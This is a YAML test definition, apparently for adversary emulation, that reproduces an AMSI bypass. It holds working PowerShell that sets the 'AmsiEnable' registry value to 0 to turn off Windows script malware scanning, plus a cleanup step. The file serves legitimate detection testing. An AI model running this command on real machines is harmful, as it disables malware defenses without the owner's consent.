api_version: "2.0"
name: AMSI Bypass - Create AMSIEnable Reg Key
description: |
    Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable” and set its value to 0.
    Ref: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d
uuid: 728eca7b-0444-4f6f-ac36-437e3d751dc0
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1562: Impair Defenses'
    subtechniques:
        - 'T1562.001: Disable or Modify Tools'
requirements:
    platforms:
        - os: windows
steps:
    - name: amsi-bypass---create-amsienable-reg-key
      inline: |
        New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force | Out-Null
      executor: powershell
      cleanup:
        inline: |
            Remove-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Recurse -Force 2> $null
        executor: powershell
